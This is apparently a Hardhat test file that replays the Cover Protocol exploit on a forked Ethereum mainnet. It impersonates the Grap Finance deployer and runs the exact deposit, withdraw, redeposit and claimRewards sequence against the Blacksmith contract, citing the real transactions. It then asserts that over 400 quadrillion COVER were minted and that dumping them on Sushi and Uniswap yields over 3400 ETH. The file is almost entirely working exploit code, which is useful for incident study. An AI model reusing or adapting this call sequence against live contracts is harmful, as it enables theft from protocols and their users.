const { assert } = require("chai");

const blacksmithAddress = "0xe0b94a7bb45dd905c79bb1992c9879f40f1caed5";
const lpTokenAddress = "0x59686e01aa841f622a43688153062c2f24f8fded";
const grapFinanceDeployer = "0x00007569643bc1709561ec2e86f385df3759e5dd";
const coverAddress = "0x5d8d9f5b96f4438195be9b99eee6118ed4304286";
const wethAddress = "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2";
const depositAmount = ethers.BigNumber.from("15255552810089260015362");

const otherUser = "0xdf1aefb979d180b4d67cca9abb4c5108c89dc8a4";
const otherUserWithdrawalAmount = "1007599009946121991627";

async function getImpersonatedSigner(address) {
  await hre.network.provider.request({
    method: "hardhat_impersonateAccount",
    params: [address]
  });
  return ethers.provider.getSigner(address);
}

describe("Cover Exploit", function() {
  let signer;
  let cover;
  before(async () => {
    cover = await ethers.getContractAt("IERC20", coverAddress);
    const blacksmith = await ethers.getContractAt("IBlacksmith", blacksmithAddress);

    signer = await getImpersonatedSigner(grapFinanceDeployer);
    const otherSigner = await getImpersonatedSigner(otherUser);

    // block 11542279
    // https://etherscan.io/tx/0x77490baee41a9b35a6e87d49453c7329c7517c10ce6ce26b4c142692a2877e65
    await blacksmith.connect(signer).deposit(lpTokenAddress, depositAmount);
    // block 11542298
    // https://etherscan.io/tx/0x88ce99fc1cb695db82d83ce5fe587396744841d3a123687f95b18df6a3106818
    await blacksmith.connect(signer).withdraw(lpTokenAddress, depositAmount.sub(1));
    // block 11542302
    // https://etherscan.io/tx/0xa27fb73caddb1cf24aa7a5afe84eed13db2f0a889a6ee0f3d5e6226a76c0fd9c
    await blacksmith.connect(otherSigner).withdraw(lpTokenAddress, otherUserWithdrawalAmount);
    // block 11542310
    // https://etherscan.io/tx/0xbd1fcda7006ddd58b18cb3bfbd01ef2d1a979be596e1c73be1d7d65fd7eb8215
    await blacksmith.connect(signer).deposit(lpTokenAddress, depositAmount.sub(1));
    // block 11542321
    // https://etherscan.io/tx/0xca135d1c4268d6354a019b66946d4fbe4de6f7ddf0ff56389a5cc2ba695b035f
    await blacksmith.connect(signer).claimRewards(lpTokenAddress);
  });

  it("should have minted an absurd number of tokens", async function() {
    const fourHundredQuadrillion = ethers.utils.parseEther("400000000000000000");
    const balance = await cover.balanceOf(grapFinanceDeployer);

    assert(balance.gt(fourHundredQuadrillion));
  });

  describe("dumping on the market", () => {
    before(async () => {
      const sushi = await ethers.getContractAt("IUniswapV2Router01", "0xd9e1ce17f2641f24ae83637ab66a2cca9c378b9f");
      const uniswap = await ethers.getContractAt("IUniswapV2Router01", "0x7a250d5630b4cf539739df2c5dacb4c659f2488d");

      const manyCover = ethers.utils.parseEther("1500000");
      const path = [coverAddress, wethAddress];
      const oneWeek = 60 * 24 * 7;

      await sushi.connect(signer).swapExactTokensForETH(manyCover, 0, path, grapFinanceDeployer, Date.now() + oneWeek);
      await cover.connect(signer).approve(uniswap.address, manyCover);
      await uniswap.connect(signer).swapExactTokensForETH(manyCover, 0, path, grapFinanceDeployer, Date.now() + oneWeek);
    });

    it("should net significant ether", async () => {
      const significantEther = ethers.utils.parseEther("3400");
      const balance = await ethers.provider.getBalance(grapFinanceDeployer);

      assert(balance.gt(significantEther));
    });
  });
});
